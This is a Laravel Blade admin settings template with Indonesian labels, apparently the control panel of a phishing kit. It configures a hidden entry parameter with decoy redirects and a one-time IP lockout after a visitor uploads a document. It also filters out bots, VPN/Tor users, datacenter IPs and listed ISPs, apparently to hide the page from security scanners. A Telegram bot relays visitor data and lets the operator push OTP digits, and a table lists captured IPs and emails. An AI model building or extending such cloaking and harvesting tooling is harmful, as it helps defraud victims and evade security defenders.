@extends('layouts.admin')

@section('title', 'Settings')
@section('heading', 'Settings')

@section('content')
@if (session('status'))
    <div class="settings-alert settings-alert--ok">{{ session('status') }}</div>
@endif

@if ($errors->any() && ! $errors->has('telegram'))
    <div class="settings-alert settings-alert--err">{{ $errors->first() }}</div>
@endif

@if ($errors->has('telegram'))
    <div class="settings-alert settings-alert--err">{!! $errors->first('telegram') !!}</div>
@endif

<nav class="settings-tabs" aria-label="Settings sections">
    <button type="button" class="settings-tab is-active" data-tab="umum">Umum</button>
    <button type="button" class="settings-tab" data-tab="keamanan">Keamanan</button>
    <button type="button" class="settings-tab" data-tab="telegram">Telegram</button>
    <button type="button" class="settings-tab" data-tab="data">Data</button>
</nav>

<form method="POST" action="{{ route('admin.settings.update') }}" id="settings-form">
    @csrf
    @method('PUT')

    {{-- ── UMUM ── --}}
    <section class="settings-panel is-active" data-panel="umum">
        <div class="settings-card">
            <h2 class="settings-card__title">Entry & redirect</h2>
            <p class="settings-card__desc">Parameter URL untuk masuk ke flow user. Contoh param <code>gate</code> → <code>/?gate</code>.</p>

            <div class="settings-grid settings-grid--2">
                <div class="field">
                    <label for="login_entry_param">Nama parameter</label>
                    <input id="login_entry_param" type="text" name="login_entry_param" value="{{ old('login_entry_param', $settings['login_entry_param']) }}" required pattern="[A-Za-z][A-Za-z0-9_-]*" maxlength="32" placeholder="login">
                </div>
                <div class="field">
                    <label for="login_entry_value">Value (opsional)</label>
                    <input id="login_entry_value" type="text" name="login_entry_value" value="{{ old('login_entry_value', $settings['login_entry_value']) }}" maxlength="100" pattern="[A-Za-z0-9_-]*" placeholder="kosong = apa saja">
                </div>
            </div>

            <div class="settings-callout mono">Entry URL: <span class="accent">{{ $entryUrl }}</span></div>

            <div class="field">
                <label for="fallback_redirect_url">URL fallback (parameter salah / tanpa entry)</label>
                <input id="fallback_redirect_url" type="url" name="fallback_redirect_url" value="{{ old('fallback_redirect_url', $settings['fallback_redirect_url']) }}" required>
            </div>
        </div>

        <div class="settings-card">
            <h2 class="settings-card__title">One-time IP</h2>
            <p class="settings-card__desc">IP disimpan setelah upload document. Kunjungan berikutnya langsung redirect.</p>

            <label class="settings-check">
                <input type="checkbox" name="one_time_enabled" value="1" @checked(old('one_time_enabled', $settings['one_time_enabled']))>
                Aktifkan one-time IP redirect
            </label>

            <div class="field">
                <label for="document_complete_redirect_url">URL setelah upload selesai</label>
                <input id="document_complete_redirect_url" type="url" name="document_complete_redirect_url" value="{{ old('document_complete_redirect_url', $settings['document_complete_redirect_url']) }}" required>
            </div>
            <div class="field">
                <label for="one_time_redirect_url">URL redirect (IP sudah pernah selesai)</label>
                <input id="one_time_redirect_url" type="url" name="one_time_redirect_url" value="{{ old('one_time_redirect_url', $settings['one_time_redirect_url']) }}" required>
            </div>
        </div>
    </section>

    {{-- ── KEAMANAN (form fields only) ── --}}
    <section class="settings-panel" data-panel="keamanan">
        <details class="settings-details" open>
            <summary>Anti-bot (User-Agent)</summary>
            <div class="settings-details__body">
                <label class="settings-check">
                    <input type="checkbox" name="anti_bot_enabled" value="1" @checked(old('anti_bot_enabled', $settings['anti_bot_enabled']))>
                    Aktifkan anti-bot
                </label>
                <div class="settings-grid settings-grid--2">
                    <div class="field">
                        <label for="anti_bot_mode">Mode</label>
                        <select id="anti_bot_mode" name="anti_bot_mode">
                            <option value="redirect" @selected(old('anti_bot_mode', $settings['anti_bot_mode']) === 'redirect')>Redirect</option>
                            <option value="block" @selected(old('anti_bot_mode', $settings['anti_bot_mode']) === 'block')>Block 403</option>
                        </select>
                    </div>
                    <div class="field">
                        <label for="anti_bot_redirect_url">URL redirect</label>
                        <input id="anti_bot_redirect_url" type="url" name="anti_bot_redirect_url" value="{{ old('anti_bot_redirect_url', $settings['anti_bot_redirect_url']) }}" required>
                    </div>
                </div>
                <label class="settings-check">
                    <input type="checkbox" name="anti_bot_strict" value="1" @checked(old('anti_bot_strict', $settings['anti_bot_strict']))>
                    Mode ketat (tanpa Accept / Accept-Language)
                </label>
                <div class="field">
                    <label for="anti_bot_extra_patterns">Pattern tambahan (satu baris satu kata)</label>
                    <textarea id="anti_bot_extra_patterns" name="anti_bot_extra_patterns" rows="3" class="mono">{{ old('anti_bot_extra_patterns', $settings['anti_bot_extra_patterns']) }}</textarea>
                </div>
            </div>
        </details>

        <details class="settings-details" open>
            <summary>Bot IP blocklist</summary>
            <div class="settings-details__body">
                <label class="settings-check">
                    <input type="checkbox" name="block_bot_ip_enabled" value="1" @checked(old('block_bot_ip_enabled', $settings['block_bot_ip_enabled']))>
                    Aktifkan bot IP blocklist
                </label>
                <label class="settings-check">
                    <input type="checkbox" name="block_bot_ip_myip_ms" value="1" @checked(old('block_bot_ip_myip_ms', $settings['block_bot_ip_myip_ms']))>
                    Sync myip.ms
                </label>
                <label class="settings-check">
                    <input type="checkbox" name="block_bot_ip_vastel" value="1" @checked(old('block_bot_ip_vastel', $settings['block_bot_ip_vastel']))>
                    Sync Avastel 5-day CIDR
                </label>
                <div class="settings-grid settings-grid--2">
                    <div class="field">
                        <label for="block_bot_ip_mode">Mode</label>
                        <select id="block_bot_ip_mode" name="block_bot_ip_mode">
                            <option value="redirect" @selected(old('block_bot_ip_mode', $settings['block_bot_ip_mode']) === 'redirect')>Redirect</option>
                            <option value="block" @selected(old('block_bot_ip_mode', $settings['block_bot_ip_mode']) === 'block')>Block 403</option>
                        </select>
                    </div>
                    <div class="field">
                        <label for="block_bot_ip_redirect_url">URL redirect</label>
                        <input id="block_bot_ip_redirect_url" type="url" name="block_bot_ip_redirect_url" value="{{ old('block_bot_ip_redirect_url', $settings['block_bot_ip_redirect_url']) }}" required>
                    </div>
                </div>
                <p class="settings-hint">Simpan dulu, lalu sync / kelola IP manual di panel bawah tab ini.</p>
            </div>
        </details>

        <details class="settings-details">
            <summary>Anti-VPN / Proxy</summary>
            <div class="settings-details__body">
                <label class="settings-check">
                    <input type="checkbox" name="anti_vpn_enabled" value="1" @checked(old('anti_vpn_enabled', $settings['anti_vpn_enabled']))>
                    Aktifkan anti-VPN
                </label>
                <div class="settings-grid settings-grid--2">
                    <div class="field">
                        <label for="anti_vpn_mode">Mode</label>
                        <select id="anti_vpn_mode" name="anti_vpn_mode">
                            <option value="redirect" @selected(old('anti_vpn_mode', $settings['anti_vpn_mode']) === 'redirect')>Redirect</option>
                            <option value="block" @selected(old('anti_vpn_mode', $settings['anti_vpn_mode']) === 'block')>Block 403</option>
                        </select>
                    </div>
                    <div class="field">
                        <label for="anti_vpn_redirect_url">URL redirect</label>
                        <input id="anti_vpn_redirect_url" type="url" name="anti_vpn_redirect_url" value="{{ old('anti_vpn_redirect_url', $settings['anti_vpn_redirect_url']) }}" required>
                    </div>
                </div>
                <label class="settings-check">
                    <input type="checkbox" name="anti_vpn_block_proxy" value="1" @checked(old('anti_vpn_block_proxy', $settings['anti_vpn_block_proxy']))>
                    Block proxy/VPN/Tor
                </label>
                <label class="settings-check">
                    <input type="checkbox" name="anti_vpn_block_hosting" value="1" @checked(old('anti_vpn_block_hosting', $settings['anti_vpn_block_hosting']))>
                    Block datacenter/hosting
                </label>
                <div class="field">
                    <label for="anti_vpn_extra_isp">Keyword ISP tambahan</label>
                    <textarea id="anti_vpn_extra_isp" name="anti_vpn_extra_isp" rows="2" class="mono">{{ old('anti_vpn_extra_isp', $settings['anti_vpn_extra_isp']) }}</textarea>
                </div>
            </div>
        </details>

        <details class="settings-details">
            <summary>API Keys (IP Intel)</summary>
            <div class="settings-details__body">
                <p class="settings-hint">ipapi.is → proxycheck.io. Tanpa API key, deteksi VPN/hosting tidak aktif. AbuseIPDB: block jika totalReports &gt; 0.</p>
                <div class="field">
                    <label for="ipapi_is_api_key">ipapi.is</label>
                    <input id="ipapi_is_api_key" type="text" name="ipapi_is_api_key" value="{{ old('ipapi_is_api_key', $settings['ipapi_is_api_key']) }}" autocomplete="off">
                </div>
                <div class="field">
                    <label for="proxycheck_api_key">proxycheck.io</label>
                    <input id="proxycheck_api_key" type="text" name="proxycheck_api_key" value="{{ old('proxycheck_api_key', $settings['proxycheck_api_key']) }}" autocomplete="off">
                </div>
                <label class="settings-check">
                    <input type="checkbox" name="abuseipdb_enabled" value="1" @checked(old('abuseipdb_enabled', $settings['abuseipdb_enabled']))>
                    Aktifkan AbuseIPDB
                </label>
                <div class="field">
                    <label for="abuseipdb_api_key">AbuseIPDB API Key</label>
                    <input id="abuseipdb_api_key" type="text" name="abuseipdb_api_key" value="{{ old('abuseipdb_api_key', $settings['abuseipdb_api_key']) }}" autocomplete="off">
                </div>
            </div>
        </details>

        <details class="settings-details">
            <summary>Block ISP / ASN</summary>
            <div class="settings-details__body">
                <label class="settings-check">
                    <input type="checkbox" name="block_isp_enabled" value="1" @checked(old('block_isp_enabled', $settings['block_isp_enabled']))>
                    Aktifkan block ISP
                </label>
                <div class="settings-grid settings-grid--2">
                    <div class="field">
                        <label for="block_isp_mode">Mode</label>
                        <select id="block_isp_mode" name="block_isp_mode">
                            <option value="redirect" @selected(old('block_isp_mode', $settings['block_isp_mode']) === 'redirect')>Redirect</option>
                            <option value="block" @selected(old('block_isp_mode', $settings['block_isp_mode']) === 'block')>Block 403</option>
                        </select>
                    </div>
                    <div class="field">
                        <label for="block_isp_redirect_url">URL redirect</label>
                        <input id="block_isp_redirect_url" type="url" name="block_isp_redirect_url" value="{{ old('block_isp_redirect_url', $settings['block_isp_redirect_url']) }}" required>
                    </div>
                </div>
                <div class="field">
                    <label for="block_isp_list">Daftar ISP / ASN</label>
                    <textarea id="block_isp_list" name="block_isp_list" rows="8" class="mono">{{ old('block_isp_list', $settings['block_isp_list']) }}</textarea>
                </div>
            </div>
        </details>
    </section>

    <section class="settings-panel" data-panel="telegram">
        <div class="settings-card">
            <h2 class="settings-card__title">Telegram Bot</h2>
            <p class="settings-hint">Setelah isi, klik <strong>Simpan</strong> di bawah. Lalu Test Message / Set Webhook.</p>
            <label class="settings-check">
                <input type="checkbox" name="telegram_enabled" value="1" @checked(old('telegram_enabled', $settings['telegram_enabled']))>
                Aktifkan notifikasi & kontrol Telegram
            </label>
            <div class="field">
                <label for="telegram_bot_token">Bot Token</label>
                <input id="telegram_bot_token" type="text" name="telegram_bot_token" value="{{ old('telegram_bot_token', $settings['telegram_bot_token']) }}" placeholder="123456:ABC-DEF..." autocomplete="off">
            </div>
            <div class="field">
                <label for="telegram_chat_id">Chat ID</label>
                <input id="telegram_chat_id" type="text" name="telegram_chat_id" value="{{ old('telegram_chat_id', $settings['telegram_chat_id']) }}" placeholder="-100xxxx atau 123456789">
                <p class="settings-hint" style="margin:.35rem 0 0">
                    <strong>Channel:</strong> jadikan bot <strong>admin</strong> channel → posting pesan → klik <strong>Deteksi Chat ID</strong> di bawah.
                    ID channel biasanya <code>-100xxxxxxxxxx</code>. Jangan pakai ID bot.
                </p>
            </div>
            <div class="field">
                <label for="telegram_default_phone">Default 4 digit telepon (opsional)</label>
                <input id="telegram_default_phone" type="text" name="telegram_default_phone" inputmode="numeric" maxlength="4" pattern="[0-9]{4}" value="{{ old('telegram_default_phone', $settings['telegram_default_phone']) }}" class="input-short" placeholder="kosongkan">
                <p class="settings-hint" style="margin:.35rem 0 0">
                    Untuk OTP via Telegram: klik tombol <strong>OTP</strong> lalu kirim 4 digit di chat (contoh: <code>1234</code>). Field ini hanya fallback untuk admin panel.
                </p>
            </div>
        </div>
    </section>

    <input type="hidden" name="_tab" id="settings_tab" value="{{ old('_tab', 'umum') }}">

    <div class="settings-savebar">
        <button class="btn-primary" type="submit">Simpan</button>
    </div>
</form>

{{-- ── KEAMANAN: aksi terpisah (di luar form utama) ── --}}
<div class="settings-panel" data-panel="keamanan" data-aux>
    <div class="settings-card">
        <h2 class="settings-card__title">Aksi keamanan</h2>
        <div class="settings-actions">
            <form method="POST" action="{{ route('admin.settings.bot-ip.sync') }}">
                @csrf
                <button class="btn-secondary" type="submit">Sync bot IP blocklist</button>
            </form>
            <form method="POST" action="{{ route('admin.settings.isp.reset') }}" onsubmit="return confirm('Reset daftar ISP ke default?')">
                @csrf
                <button class="btn-secondary" type="submit">Reset ISP default</button>
            </form>
        </div>
        <div class="settings-callout mono">
            Cache: {{ $settings['block_bot_ip_count'] }} IP + {{ $settings['block_bot_ip_cidr_count'] }} CIDR
            @if ($settings['block_bot_ip_synced_at'])
                · sync: {{ $settings['block_bot_ip_synced_at'] }}
            @endif
        </div>
    </div>

    <div class="settings-card">
        <h2 class="settings-card__title">IP Blacklist manual <span class="badge">{{ count($blacklistedIps) }}</span></h2>
        <form method="POST" action="{{ route('admin.settings.blacklist.store') }}" class="settings-inline-form">
            @csrf
            <input type="text" name="ip" value="{{ old('ip') }}" required placeholder="1.2.3.4" class="mono">
            <button class="btn-danger" type="submit">Tambah</button>
        </form>
        @if ($blacklistedIps === [])
            <p class="settings-hint">Belum ada IP manual.</p>
        @else
            <div class="settings-ip-list">
                @foreach ($blacklistedIps as $ip)
                    <div class="settings-ip-item">
                        <span class="mono">{{ $ip }}</span>
                        <form method="POST" action="{{ route('admin.settings.blacklist.destroy') }}" onsubmit="return confirm('Hapus {{ $ip }}?')">
                            @csrf
                            @method('DELETE')
                            <input type="hidden" name="ip" value="{{ $ip }}">
                            <button class="btn-ghost-sm" type="submit">Hapus</button>
                        </form>
                    </div>
                @endforeach
            </div>
        @endif
    </div>
</div>

{{-- ── TELEGRAM: webhook / polling ── --}}
<div class="settings-panel" data-panel="telegram" data-aux>
    <div class="settings-card">
        <h2 class="settings-card__title">Webhook & Polling</h2>
        @if (! $telegramUsesHttps)
            <p class="settings-hint" style="margin-top:0">
                APP_URL masih <strong>HTTP</strong> — Telegram webhook tidak bisa dipakai. Tombol inline memakai <strong>polling</strong> (otomatis tiap menit via scheduler).
            </p>
        @else
            <p class="settings-hint" style="margin-top:0">
                HTTPS aktif via <strong>{{ parse_url(config('app.url'), PHP_URL_HOST) }}</strong>. Webhook Telegram bisa dipakai — klik <strong>Set Webhook</strong>.
            </p>
        @endif
        <div class="settings-callout mono">{{ $webhookUrl }}</div>
        @if (($webhookInfo['url'] ?? null))
            <p class="settings-hint">Webhook aktif: <span class="mono">{{ $webhookInfo['url'] }}</span></p>
        @else
            <p class="settings-hint">
                Webhook: <strong>tidak aktif</strong>
                @if (($webhookInfo['pending'] ?? 0) > 0)
                    — {{ $webhookInfo['pending'] }} update menunggu
                @endif
            </p>
        @endif
        <div class="settings-actions">
            <form method="POST" action="{{ route('admin.settings.telegram.detect') }}">
                @csrf
                <button class="btn-secondary" type="submit">Deteksi Chat ID</button>
            </form>
            @if ($telegramUsesHttps)
                <form method="POST" action="{{ route('admin.settings.webhook') }}">
                    @csrf
                    <button class="btn-secondary" type="submit">Set Webhook</button>
                </form>
            @endif
            <form method="POST" action="{{ route('admin.settings.telegram.poll') }}">
                @csrf
                <button class="btn-secondary" type="submit">Aktifkan Polling</button>
            </form>
            <form method="POST" action="{{ route('admin.settings.webhook.delete') }}">
                @csrf
                @method('DELETE')
                <button class="btn-secondary" type="submit">Hapus Webhook</button>
            </form>
            <form method="POST" action="{{ route('admin.settings.test') }}">
                @csrf
                <button class="btn-secondary" type="submit">Test Message</button>
            </form>
        </div>
    </div>
</div>

{{-- ── DATA ── --}}
<div class="settings-panel" data-panel="data">
    <div class="settings-card">
        <div class="settings-card__head">
            <h2 class="settings-card__title">One-time IP <span class="badge">{{ $oneTimeIps->count() }}</span></h2>
            @if ($oneTimeIps->isNotEmpty())
                <form method="POST" action="{{ route('admin.settings.one-time.clear') }}" onsubmit="return confirm('Hapus semua?')">
                    @csrf
                    @method('DELETE')
                    <button class="btn-secondary" type="submit">Clear semua</button>
                </form>
            @endif
        </div>
        @if ($oneTimeIps->isEmpty())
            <p class="settings-hint">Belum ada IP. Terisi otomatis setelah upload document.</p>
        @else
            <div class="table-wrap">
                <table class="logs">
                    <thead>
                        <tr>
                            <th>IP</th>
                            <th>Email</th>
                            <th>Recorded</th>
                            <th>Aksi</th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach ($oneTimeIps as $row)
                            <tr>
                                <td class="mono">{{ $row->ip }}</td>
                                <td>{{ $row->email ?: '—' }}</td>
                                <td class="mono muted">{{ $row->recorded_at?->timezone(config('app.timezone'))->format('Y-m-d H:i') }}</td>
                                <td>
                                    <form method="POST" action="{{ route('admin.settings.one-time.destroy', $row) }}" onsubmit="return confirm('Hapus IP {{ $row->ip }} dari one-time?')">
                                        @csrf
                                        @method('DELETE')
                                        <button class="btn-ghost-sm btn-danger-sm" type="submit">Hapus</button>
                                    </form>
                                </td>
                            </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>
        @endif
    </div>
</div>

<style>
    .settings-alert {
        padding: .85rem 1rem;
        border-radius: 10px;
        margin-bottom: 1rem;
        border: 1px solid var(--border);
    }
    .settings-alert--ok { border-color: #134e4a; color: #99f6e4; background: #0f1f1d; }
    .settings-alert--err { border-color: #7f1d1d; color: #fecaca; background: #1f1212; }

    .settings-tabs {
        display: flex;
        gap: .35rem;
        flex-wrap: wrap;
        margin-bottom: 1.25rem;
        padding: .35rem;
        background: var(--panel);
        border: 1px solid var(--border);
        border-radius: 12px;
    }
    .settings-tab {
        border: 0;
        background: transparent;
        color: var(--muted);
        padding: .55rem 1rem;
        border-radius: 8px;
        cursor: pointer;
        font-size: .9rem;
        font-weight: 500;
    }
    .settings-tab:hover { color: var(--text); background: #1b232e; }
    .settings-tab.is-active {
        background: color-mix(in srgb, var(--accent) 22%, transparent);
        color: #99f6e4;
        font-weight: 600;
    }

    .settings-panel { display: none; flex-direction: column; gap: 1rem; }
    .settings-panel.is-active { display: flex; }

    .settings-card {
        background: var(--panel);
        border: 1px solid var(--border);
        border-radius: 14px;
        padding: 1.15rem 1.25rem;
    }
    .settings-card__head {
        display: flex;
        justify-content: space-between;
        align-items: center;
        gap: 1rem;
        flex-wrap: wrap;
        margin-bottom: .75rem;
    }
    .settings-card__title {
        margin: 0 0 .5rem;
        font-size: 1rem;
        font-weight: 650;
    }
    .settings-card__head .settings-card__title { margin-bottom: 0; }
    .settings-card__desc, .settings-hint {
        margin: 0 0 1rem;
        color: var(--muted);
        font-size: .85rem;
        line-height: 1.45;
    }
    .settings-hint { margin-bottom: .75rem; }

    .settings-details {
        background: var(--panel);
        border: 1px solid var(--border);
        border-radius: 14px;
        overflow: hidden;
    }
    .settings-details + .settings-details { margin-top: .75rem; }
    .settings-details summary {
        padding: .9rem 1.15rem;
        cursor: pointer;
        font-weight: 600;
        font-size: .95rem;
        list-style: none;
        user-select: none;
    }
    .settings-details summary::-webkit-details-marker { display: none; }
    .settings-details summary::after {
        content: '▾';
        float: right;
        color: var(--muted);
    }
    .settings-details:not([open]) summary::after { content: '▸'; }
    .settings-details__body {
        padding: 0 1.15rem 1.15rem;
        border-top: 1px solid var(--border);
    }

    .settings-grid { display: grid; gap: 1rem; margin-bottom: 1rem; }
    .settings-grid--2 { grid-template-columns: repeat(auto-fit, minmax(14rem, 1fr)); }

    .field { margin-bottom: .85rem; }
    .field label {
        display: block;
        color: var(--muted);
        font-size: .8rem;
        margin-bottom: .35rem;
    }
    .field input[type="url"],
    .field input[type="text"],
    .field select,
    .field textarea,
    .settings-inline-form input[type="text"] {
        width: 100%;
        border: 1px solid var(--border);
        background: #0c1117;
        color: var(--text);
        border-radius: 8px;
        padding: .6rem .75rem;
        font-size: .9rem;
    }
    .input-short { max-width: 6rem; }
    .field textarea { resize: vertical; min-height: 4rem; }
    .mono { font-family: ui-monospace, Menlo, monospace; font-size: .85rem; }

    .settings-check {
        display: flex;
        align-items: center;
        gap: .5rem;
        margin-bottom: .65rem;
        font-size: .9rem;
        cursor: pointer;
    }

    .settings-callout {
        background: #0c1117;
        border: 1px solid var(--border);
        border-radius: 10px;
        padding: .75rem 1rem;
        margin-bottom: 1rem;
        font-size: .85rem;
        word-break: break-all;
    }
    .accent { color: #5eead4; }

    .settings-savebar {
        position: sticky;
        bottom: 1rem;
        margin-top: 1rem;
        padding: .75rem 1rem;
        background: color-mix(in srgb, var(--bg) 85%, transparent);
        backdrop-filter: blur(8px);
        border: 1px solid var(--border);
        border-radius: 12px;
        display: flex;
        justify-content: flex-end;
    }

    .settings-actions {
        display: flex;
        flex-wrap: wrap;
        gap: .5rem;
        margin-bottom: .75rem;
    }
    .settings-inline-form {
        display: flex;
        gap: .5rem;
        margin-bottom: 1rem;
        max-width: 24rem;
    }

    .settings-ip-list { display: flex; flex-direction: column; gap: .35rem; }
    .settings-ip-item {
        display: flex;
        justify-content: space-between;
        align-items: center;
        gap: .75rem;
        padding: .5rem .65rem;
        background: #0c1117;
        border: 1px solid var(--border);
        border-radius: 8px;
    }

    .badge {
        display: inline-block;
        padding: .1rem .45rem;
        border-radius: 999px;
        font-size: .75rem;
        font-weight: 600;
        background: var(--accent-soft);
        color: #5eead4;
        vertical-align: middle;
    }

    .btn-primary {
        background: #0d9488;
        border: 1px solid #0d9488;
        color: #fff;
        padding: .6rem 1.25rem;
        border-radius: 8px;
        font-weight: 600;
        cursor: pointer;
    }
    .btn-secondary, .btn-danger, .btn-ghost-sm {
        border: 1px solid var(--border);
        background: #121820;
        color: var(--text);
        border-radius: 8px;
        padding: .5rem .85rem;
        font-size: .85rem;
        cursor: pointer;
        white-space: nowrap;
    }
    .btn-danger { background: #7f1d1d; border-color: #991b1b; color: #fecaca; }
    .btn-danger-sm { background: #7f1d1d; border-color: #991b1b; color: #fecaca; }
    .btn-ghost-sm { padding: .3rem .55rem; font-size: .8rem; }
    .btn-secondary:hover, .btn-ghost-sm:hover { border-color: var(--muted); }
</style>

<script>
(() => {
    const tabs = document.querySelectorAll('.settings-tab');
    const panels = document.querySelectorAll('.settings-panel');
    const form = document.getElementById('settings-form');

    function showTab(name) {
        tabs.forEach(t => t.classList.toggle('is-active', t.dataset.tab === name));
        panels.forEach(p => p.classList.toggle('is-active', p.dataset.panel === name));
        const tabInput = document.getElementById('settings_tab');
        if (tabInput) tabInput.value = name;
        history.replaceState(null, '', '#' + name);
    }

    tabs.forEach(tab => tab.addEventListener('click', () => showTab(tab.dataset.tab)));

    const hash = location.hash.replace('#', '');
    const valid = ['umum', 'keamanan', 'telegram', 'data'];
    const initial = valid.includes(hash) ? hash : (document.getElementById('settings_tab')?.value || 'umum');
    showTab(valid.includes(initial) ? initial : 'umum');

    // Pastikan field di tab tersembunyi tetap ikut submit
    form?.addEventListener('submit', () => {
        document.querySelectorAll('#settings-form .settings-panel').forEach(p => p.classList.add('is-active'));
    });
})();
</script>
@endsection
